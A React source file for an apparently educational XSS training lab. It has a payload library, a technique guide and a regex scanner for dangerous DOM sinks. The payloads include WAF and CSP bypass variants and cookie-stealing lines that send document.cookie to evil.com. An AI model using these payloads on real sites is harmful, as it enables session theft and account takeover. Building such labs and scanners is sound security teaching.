import { useState, useRef, useEffect, useCallback } from "react";
import { useLocation } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { Terminal, Copy, Check, RotateCcw, ChevronRight, AlertTriangle, Shield, BookOpen, Zap } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

// ─── XSS Payloads ───────────────────────────────────────────────────────────
const XSS_PAYLOADS = [
  { id: 1, label: "Basic Script Tag", payload: `<script>alert(1)</script>`, bypass: false, category: "Basic" },
  { id: 2, label: "IMG onerror", payload: `<img src=x onerror=alert(1)>`, bypass: false, category: "Basic" },
  { id: 3, label: "SVG onload", payload: `<svg/onload=alert(1)>`, bypass: false, category: "Basic" },
  { id: 4, label: "Attribute Breakout", payload: `"><script>alert(document.domain)</script>`, bypass: false, category: "Basic" },
  { id: 5, label: "Body onload", payload: `<body onload=alert(1)>`, bypass: false, category: "Basic" },
  { id: 6, label: "javascript: URI", payload: `javascript:alert(1)`, bypass: false, category: "Basic" },
  { id: 7, label: "Details ontoggle", payload: `<details open ontoggle=alert(1)>`, bypass: false, category: "HTML5" },
  { id: 8, label: "Input autofocus", payload: `<input autofocus onfocus=alert(1)>`, bypass: false, category: "HTML5" },
  { id: 9, label: "Video source onerror", payload: `<video><source onerror="alert(1)">`, bypass: false, category: "HTML5" },
  { id: 10, label: "iframe srcdoc", payload: `<iframe srcdoc='<script>alert(1)</script>'>`, bypass: true, category: "HTML5" },
  { id: 11, label: "Mixed Case WAF Bypass", payload: `<sCrIpT>alert(1)</sCrIpT>`, bypass: true, category: "WAF Bypass" },
  { id: 12, label: "HTML Entity Encoded", payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`, bypass: true, category: "WAF Bypass" },
  { id: 13, label: "Double Encode", payload: `%253Cscript%253Ealert(1)%253C/script%253E`, bypass: true, category: "WAF Bypass" },
  { id: 14, label: "Filter Evasion Shorthand", payload: `'"><img/src/onerror=alert(1)>`, bypass: true, category: "WAF Bypass" },
  { id: 15, label: "Cookie Stealer", payload: `<script>fetch('https://evil.com/?c='+document.cookie)</script>`, bypass: false, category: "Advanced" },
  { id: 16, label: "DOM Clobbering", payload: `<img name=cookie><script>alert(cookie.src)</script>`, bypass: false, category: "Advanced" },
  { id: 17, label: "MathML Mutation", payload: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, bypass: true, category: "Advanced" },
  { id: 18, label: "CSP Bypass via JSONP", payload: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">`, bypass: true, category: "CSP Bypass" },
  { id: 19, label: "Object data URI", payload: `<object data="javascript:alert(1)">`, bypass: false, category: "Advanced" },
  { id: 20, label: "Select onfocus", payload: `<select autofocus onfocus=alert(1)>`, bypass: false, category: "HTML5" },
];

const CATEGORIES = ["All", "Basic", "HTML5", "WAF Bypass", "Advanced", "CSP Bypass"];

const MODE_TARGETS: Record<string, string> = {
  Reflected: "/api/lab/xss/reflected",
  Stored: "/api/lab/xss/stored",
  DOM: "/api/lab/xss/dom",
};

// ─── XSS Scanner ─────────────────────────────────────────────────────────────
interface ScanFinding {
  line: number;
  sink: string;
  severity: "critical" | "high" | "medium" | "info";
  desc: string;
  fix: string;
}

function scanCode(code: string): ScanFinding[] {
  const findings: ScanFinding[] = [];
  const lines = code.split("\n");

  const patterns: { re: RegExp; sink: string; severity: ScanFinding["severity"]; desc: string; fix: string }[] = [
    {
      re: /\.innerHTML\s*=/g, sink: "innerHTML", severity: "critical",
      desc: "Direct innerHTML assignment can execute injected scripts via HTML parsing.",
      fix: "Use textContent or DOMPurify.sanitize() before assigning.",
    },
    {
      re: /\.outerHTML\s*=/g, sink: "outerHTML", severity: "critical",
      desc: "outerHTML replaces the element entirely and parses HTML — same risk as innerHTML.",
      fix: "Avoid outerHTML with untrusted data. Use createElement + textContent instead.",
    },
    {
      re: /document\.write\s*\(/g, sink: "document.write()", severity: "critical",
      desc: "document.write() directly writes to the page and will execute script tags.",
      fix: "Never use document.write() with user-controlled data. Use DOM APIs instead.",
    },
    {
      re: /document\.writeln\s*\(/g, sink: "document.writeln()", severity: "critical",
      desc: "Same risk as document.write().",
      fix: "Replace with safe DOM manipulation APIs.",
    },
    {
      re: /dangerouslySetInnerHTML/g, sink: "dangerouslySetInnerHTML", severity: "critical",
      desc: "React's dangerouslySetInnerHTML bypasses React's XSS protection.",
      fix: "Sanitize with DOMPurify.sanitize() before passing to __html.",
    },
    {
      re: /eval\s*\(/g, sink: "eval()", severity: "critical",
      desc: "eval() executes arbitrary JavaScript strings — critical if user-controlled.",
      fix: "Never pass user input to eval(). Use JSON.parse() for data, structured APIs for logic.",
    },
    {
      re: /setTimeout\s*\(\s*['"]/g, sink: "setTimeout(string)", severity: "high",
      desc: "setTimeout with a string argument evaluates code like eval().",
      fix: "Pass a function reference instead: setTimeout(() => ..., delay).",
    },
    {
      re: /setInterval\s*\(\s*['"]/g, sink: "setInterval(string)", severity: "high",
      desc: "setInterval with string argument is equivalent to eval().",
      fix: "Pass a function reference instead.",
    },
    {
      re: /(?:window|document|location)\s*\.\s*(?:location|href)\s*=|location\s*=|location\.href\s*=|location\.assign\s*\(/g, sink: "location redirect", severity: "high",
      desc: "Assigning to location with user input enables javascript: URI XSS.",
      fix: "Validate URL scheme is https:// or http:// before assigning.",
    },
    {
      re: /\$\s*\(\s*[^'"`][^)]*\)\.html\s*\(/g, sink: "jQuery .html()", severity: "high",
      desc: "jQuery .html() parses and renders HTML — vulnerable if argument contains user input.",
      fix: "Use .text() for plain text, or sanitize with DOMPurify before calling .html().",
    },
    {
      re: /insertAdjacentHTML\s*\(/g, sink: "insertAdjacentHTML()", severity: "critical",
      desc: "insertAdjacentHTML parses HTML strings like innerHTML.",
      fix: "Use insertAdjacentText() for text, or sanitize input with DOMPurify.",
    },
    {
      re: /\.src\s*=|\.href\s*=|\.action\s*=/g, sink: "URL property assignment", severity: "medium",
      desc: "Setting .src, .href, or .action with user input may enable javascript: URI injection.",
      fix: "Validate that the value starts with https:// or http:// before assigning.",
    },
    {
      re: /new\s+Function\s*\(/g, sink: "new Function()", severity: "critical",
      desc: "new Function() compiles and executes arbitrary code strings.",
      fix: "Never use new Function() with user-controlled input.",
    },
  ];

  for (let idx = 0; idx < lines.length; idx++) {
    const line = lines[idx];
    for (const { re, sink, severity, desc, fix } of patterns) {
      re.lastIndex = 0;
      if (re.test(line)) {
        findings.push({ line: idx + 1, sink, severity, desc, fix });
      }
    }
  }

  return findings;
}

const SEVERITY_STYLE: Record<string, string> = {
  critical: "border-red-500 text-red-400",
  high: "border-orange-400 text-orange-400",
  medium: "border-yellow-400 text-yellow-400",
  info: "border-primary text-primary",
};

const SEVERITY_BG: Record<string, string> = {
  critical: "bg-red-950/40",
  high: "bg-orange-950/30",
  medium: "bg-yellow-950/20",
  info: "bg-green-950/20",
};

// ─── XSS Technique Guide ─────────────────────────────────────────────────────
const GUIDE = [
  {
    title: "1. Reflected XSS",
    content: "The payload is embedded in the server's response immediately. Typically via URL params or form fields that are echoed back without sanitization. Best tested by injecting a basic <script>alert(1)</script> and checking if it fires.",
    example: `// Vulnerable server code:
res.send('<p>Search: ' + req.query.q + '</p>');

// Payload in URL:
?q=<script>alert(document.cookie)</script>`,
  },
  {
    title: "2. Stored XSS",
    content: "The payload is stored in a database and rendered for every user who views the affected page. Higher impact than reflected XSS because it doesn't require social engineering — any visitor triggers it.",
    example: `// Stored in DB, rendered unsanitized:
db.query("SELECT body FROM comments WHERE id=?", [id]);
res.send('<div>' + comment.body + '</div>');

// Payload as comment body:
<script>document.location='https://evil.com/?c='+document.cookie</script>`,
  },
  {
    title: "3. DOM-based XSS",
    content: "The payload executes via client-side JavaScript reading from a tainted source (location.hash, location.search, document.referrer) and writing to a dangerous sink (innerHTML, document.write). The server never sees the payload.",
    example: `// Vulnerable client-side code:
const hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// Payload in URL:
https://target.com/page#<img src=x onerror=alert(1)>`,
  },
  {
    title: "4. WAF Bypass Techniques",
    content: "Web Application Firewalls block common XSS patterns. Bypass methods include case mixing, HTML entity encoding, null bytes, Unicode escapes, and alternative event handlers.",
    example: `// Mixed case bypass:
<sCrIpT>alert(1)</sCrIpT>

// HTML entity encoding:
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

// Alternative vectors:
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>`,
  },
  {
    title: "5. CSP Evasion",
    content: "Content Security Policy blocks inline scripts and restricts script sources. Bypass techniques target whitelisted domains that host JSONP endpoints or Angular/React libraries that allow code execution.",
    example: `// JSONP bypass on whitelisted domain:
<script src="https://whitelisted.com/api?callback=alert(1)">

// Angular (if angular.js is whitelisted):
{{constructor.constructor('alert(1)')()}}

// React in dev mode (eval-based):
// Target apps that load babel-standalone from CDN`,
  },
];

// ─── Component ───────────────────────────────────────────────────────────────
export default function LabXss() {
  const [, setLocation] = useLocation();
  const [mode, setMode] = useState<"Reflected" | "Stored" | "DOM">("Reflected");
  const [activeTab, setActiveTab] = useState<"payloads" | "scanner" | "guide">("payloads");
  const [categoryFilter, setCategoryFilter] = useState("All");
  const [copiedId, setCopiedId] = useState<number | null>(null);
  const [scanCode_, setScanCode_] = useState("");
  const [scanResults, setScanResults] = useState<ScanFinding[] | null>(null);
  const [iframeKey, setIframeKey] = useState(0);
  const [iframeUrl, setIframeUrl] = useState(`/api/lab/xss/reflected`);
  const [payloadInput, setPayloadInput] = useState("");
  const iframeRef = useRef<HTMLIFrameElement>(null);

  useEffect(() => {
    setIframeUrl(MODE_TARGETS[mode]);
    setIframeKey((k) => k + 1);
    setPayloadInput("");
  }, [mode]);

  const injectPayload = useCallback((payload: string) => {
    setPayloadInput(payload);
    if (mode === "Reflected") {
      const url = `/api/lab/xss/reflected?payload=${encodeURIComponent(payload)}`;
      setIframeUrl(url);
      setIframeKey((k) => k + 1);
    } else if (mode === "DOM") {
      const url = `/api/lab/xss/dom#${encodeURIComponent(payload)}`;
      setIframeUrl(url);
      setIframeKey((k) => k + 1);
    }
    // For stored XSS, user submits the form inside the iframe
  }, [mode]);

  const handleCopy = (id: number, payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  const handleScan = () => {
    const results = scanCode(scanCode_);
    setScanResults(results);
  };

  const handleReset = async () => {
    if (mode === "Stored") {
      await fetch("/api/lab/xss/stored/reset", { method: "DELETE" });
    }
    setIframeKey((k) => k + 1);
    setIframeUrl(MODE_TARGETS[mode]);
    setPayloadInput("");
  };

  const filteredPayloads =
    categoryFilter === "All" ? XSS_PAYLOADS : XSS_PAYLOADS.filter((p) => p.category === categoryFilter);

  return (
    <div className="h-screen bg-background text-foreground font-mono flex flex-col overflow-hidden">
      {/* Top Bar */}
      <div className="border-b border-border flex items-center justify-between px-4 py-2 flex-shrink-0 bg-background">
        <div className="flex items-center gap-4">
          <button
            className="text-primary font-bold tracking-widest glitch text-lg"
            onClick={() => setLocation("/")}
            data-testid="logo-link"
          >
            41M4
          </button>
          <span className="text-border">|</span>
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <button onClick={() => setLocation("/lab")} className="hover:text-primary transition-colors">
              attack-box
            </button>
            <ChevronRight className="w-3 h-3" />
            <span className="text-primary font-bold">XSS LABORATORY</span>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {(["Reflected", "Stored", "DOM"] as const).map((m) => (
            <button
              key={m}
              onClick={() => setMode(m)}
              className={`text-xs px-3 py-1 border transition-all ${
                mode === m
                  ? "border-primary text-primary bg-primary/10"
                  : "border-border/50 text-muted-foreground hover:border-primary/50"
              }`}
              data-testid={`mode-btn-${m.toLowerCase()}`}
            >
              [{m.toUpperCase()}]
            </button>
          ))}
          <button
            onClick={handleReset}
            className="text-xs px-2 py-1 border border-border/50 text-muted-foreground hover:text-orange-400 hover:border-orange-400/50 transition-all flex items-center gap-1"
            data-testid="btn-reset-lab"
            title="Reset lab"
          >
            <RotateCcw className="w-3 h-3" />
          </button>
        </div>
      </div>

      {/* Main Split */}
      <div className="flex flex-1 overflow-hidden">
        {/* Left: Iframe Target */}
        <div className="flex-1 flex flex-col border-r border-border min-w-0">
          <div className="bg-card/50 border-b border-border px-3 py-2 flex items-center gap-2 flex-shrink-0">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-500"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-green-500"></div>
            <span className="text-xs text-muted-foreground ml-2 font-mono truncate">{iframeUrl}</span>
          </div>

          {mode === "Reflected" && (
            <div className="border-b border-border bg-card/30 px-3 py-2 flex gap-2 flex-shrink-0">
              <input
                className="flex-1 bg-background border border-border text-primary text-xs px-2 py-1 font-mono outline-none focus:border-primary"
                value={payloadInput}
                onChange={(e) => setPayloadInput(e.target.value)}
                placeholder="Paste or type payload..."
                onKeyDown={(e) => {
                  if (e.key === "Enter") injectPayload(payloadInput);
                }}
                data-testid="payload-input"
              />
              <button
                className="text-xs bg-primary text-background px-3 py-1 font-bold hover:bg-primary/80 transition-colors"
                onClick={() => injectPayload(payloadInput)}
                data-testid="btn-inject"
              >
                [INJECT]
              </button>
            </div>
          )}

          {mode === "DOM" && (
            <div className="border-b border-border bg-card/30 px-3 py-2 flex gap-2 flex-shrink-0">
              <input
                className="flex-1 bg-background border border-border text-primary text-xs px-2 py-1 font-mono outline-none focus:border-primary"
                value={payloadInput}
                onChange={(e) => setPayloadInput(e.target.value)}
                placeholder="DOM payload (injected as #hash)..."
                onKeyDown={(e) => {
                  if (e.key === "Enter") injectPayload(payloadInput);
                }}
                data-testid="dom-payload-input"
              />
              <button
                className="text-xs bg-primary text-background px-3 py-1 font-bold hover:bg-primary/80 transition-colors"
                onClick={() => injectPayload(payloadInput)}
                data-testid="btn-inject-dom"
              >
                [SET HASH]
              </button>
            </div>
          )}

          {mode === "Stored" && (
            <div className="border-b border-border bg-card/30 px-3 py-2 text-xs text-muted-foreground flex-shrink-0">
              <span className="text-orange-400 mr-2">[STORED MODE]</span>
              Type payload into the comment form in the target window, then submit. Click a payload to pre-fill.
            </div>
          )}

          <iframe
            key={iframeKey}
            ref={iframeRef}
            src={iframeUrl}
            className="flex-1 w-full border-none bg-[#050505]"
            title="XSS Lab Target"
            data-testid="lab-iframe"
          />
        </div>

        {/* Right: Control Panel */}
        <div className="w-[420px] flex-shrink-0 flex flex-col overflow-hidden">
          {/* Tab Bar */}
          <div className="flex border-b border-border flex-shrink-0">
            {[
              { key: "payloads", label: "PAYLOADS", icon: <Zap className="w-3 h-3" /> },
              { key: "scanner", label: "SCANNER", icon: <Shield className="w-3 h-3" /> },
              { key: "guide", label: "TECHNIQUE", icon: <BookOpen className="w-3 h-3" /> },
            ].map((tab) => (
              <button
                key={tab.key}
                onClick={() => setActiveTab(tab.key as typeof activeTab)}
                className={`flex-1 flex items-center justify-center gap-1.5 px-3 py-2.5 text-xs font-bold tracking-wider transition-all border-b-2 ${
                  activeTab === tab.key
                    ? "border-primary text-primary bg-primary/5"
                    : "border-transparent text-muted-foreground hover:text-primary/70"
                }`}
                data-testid={`tab-${tab.key}`}
              >
                {tab.icon} {tab.label}
              </button>
            ))}
          </div>

          {/* Tab Content */}
          <div className="flex-1 overflow-y-auto">
            <AnimatePresence mode="wait">
              {/* ── PAYLOADS TAB ─────────────────────────────── */}
              {activeTab === "payloads" && (
                <motion.div
                  key="payloads"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="flex flex-col h-full"
                >
                  <div className="p-3 border-b border-border flex gap-1.5 flex-wrap">
                    {CATEGORIES.map((cat) => (
                      <button
                        key={cat}
                        onClick={() => setCategoryFilter(cat)}
                        className={`text-xs px-2 py-0.5 border transition-all ${
                          categoryFilter === cat
                            ? "border-primary text-primary bg-primary/10"
                            : "border-border/50 text-muted-foreground hover:border-primary/30"
                        }`}
                        data-testid={`filter-${cat.toLowerCase().replace(/\s+/g, "-")}`}
                      >
                        {cat}
                      </button>
                    ))}
                  </div>

                  <div className="flex flex-col divide-y divide-border/30">
                    {filteredPayloads.map((p) => (
                      <div
                        key={p.id}
                        className="group px-3 py-2.5 hover:bg-primary/5 transition-colors"
                      >
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-xs font-bold text-foreground">{p.label}</span>
                          <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                            <button
                              onClick={() => handleCopy(p.id, p.payload)}
                              className="text-muted-foreground hover:text-primary p-1 transition-colors"
                              title="Copy payload"
                              data-testid={`copy-${p.id}`}
                            >
                              {copiedId === p.id ? <Check className="w-3 h-3 text-primary" /> : <Copy className="w-3 h-3" />}
                            </button>
                            <button
                              onClick={() => injectPayload(p.payload)}
                              className="text-xs bg-primary/20 text-primary border border-primary/30 px-2 py-0.5 hover:bg-primary hover:text-background transition-all"
                              data-testid={`inject-${p.id}`}
                            >
                              INJECT
                            </button>
                          </div>
                        </div>
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-xs text-muted-foreground/50">{p.category}</span>
                          {p.bypass && (
                            <span className="text-xs text-orange-400 border border-orange-400/30 px-1">WAF BYPASS</span>
                          )}
                        </div>
                        <code className="text-xs text-primary/70 break-all leading-relaxed block">
                          {p.payload.length > 80 ? p.payload.substring(0, 80) + "…" : p.payload}
                        </code>
                      </div>
                    ))}
                  </div>
                </motion.div>
              )}

              {/* ── SCANNER TAB ──────────────────────────────── */}
              {activeTab === "scanner" && (
                <motion.div
                  key="scanner"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="p-3 flex flex-col gap-3"
                >
                  <div className="text-xs text-muted-foreground">
                    Paste HTML, JavaScript, or React code to scan for XSS sinks and vulnerabilities.
                  </div>
                  <Textarea
                    value={scanCode_}
                    onChange={(e) => setScanCode_(e.target.value)}
                    placeholder={`// Paste code to analyze...\n\ndocument.getElementById('out').innerHTML = userInput;\neval(req.query.cmd);`}
                    className="bg-card border-border text-primary font-mono text-xs resize-none h-40 rounded-none focus-visible:ring-0 focus-visible:ring-offset-0"
                    data-testid="scanner-input"
                  />
                  <button
                    onClick={handleScan}
                    className="bg-primary text-background text-xs font-bold py-2 px-4 hover:bg-primary/80 transition-colors tracking-wider"
                    data-testid="btn-scan"
                  >
                    [ANALYZE FOR XSS SINKS]
                  </button>

                  {scanResults !== null && (
                    <div className="flex flex-col gap-2 mt-1">
                      <div className="text-xs text-muted-foreground border-b border-border pb-2 flex justify-between">
                        <span>Scan complete</span>
                        <span className={scanResults.length > 0 ? "text-red-400" : "text-primary"}>
                          {scanResults.length > 0
                            ? `${scanResults.length} finding${scanResults.length > 1 ? "s" : ""} detected`
                            : "No sinks found"}
                        </span>
                      </div>
                      {scanResults.length === 0 && (
                        <div className="text-xs text-primary/60 border border-primary/20 p-3 text-center">
                          No obvious XSS sinks detected. Manual review recommended.
                        </div>
                      )}
                      {scanResults.map((f, i) => (
                        <motion.div
                          key={i}
                          initial={{ opacity: 0, x: 10 }}
                          animate={{ opacity: 1, x: 0 }}
                          transition={{ delay: i * 0.04 }}
                          className={`border ${SEVERITY_STYLE[f.severity]} ${SEVERITY_BG[f.severity]} p-3`}
                        >
                          <div className="flex items-center justify-between mb-1">
                            <span className="font-bold text-xs">{f.sink}</span>
                            <div className="flex items-center gap-2">
                              <span className="text-xs opacity-60">Line {f.line}</span>
                              <span className={`text-xs border px-1.5 ${SEVERITY_STYLE[f.severity]}`}>
                                {f.severity.toUpperCase()}
                              </span>
                            </div>
                          </div>
                          <p className="text-xs opacity-80 mb-1 leading-relaxed">{f.desc}</p>
                          <p className="text-xs opacity-60 italic leading-relaxed">{f.fix}</p>
                        </motion.div>
                      ))}
                    </div>
                  )}
                </motion.div>
              )}

              {/* ── GUIDE TAB ────────────────────────────────── */}
              {activeTab === "guide" && (
                <motion.div
                  key="guide"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="p-3 flex flex-col gap-4"
                >
                  <div className="text-xs text-muted-foreground">
                    XSS technique reference — methodology and examples for each attack class.
                  </div>
                  {GUIDE.map((section, i) => (
                    <div key={i} className="border border-border/50 hover:border-primary/30 transition-colors">
                      <div className="border-b border-border/50 px-3 py-2 text-xs font-bold text-primary tracking-wider">
                        {section.title}
                      </div>
                      <div className="p-3">
                        <p className="text-xs text-muted-foreground leading-relaxed mb-3">{section.content}</p>
                        <pre className="bg-background text-primary/70 text-xs p-3 border border-border/30 overflow-x-auto whitespace-pre-wrap break-all">
                          {section.example}
                        </pre>
                      </div>
                    </div>
                  ))}
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Status Bar */}
          <div className="border-t border-border px-3 py-1.5 flex items-center justify-between flex-shrink-0 bg-card/30">
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <span className="text-green-500">●</span>
              <span>TARGET LIVE</span>
            </div>
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <AlertTriangle className="w-3 h-3 text-orange-400" />
              <span>AUTHORIZED USE ONLY</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
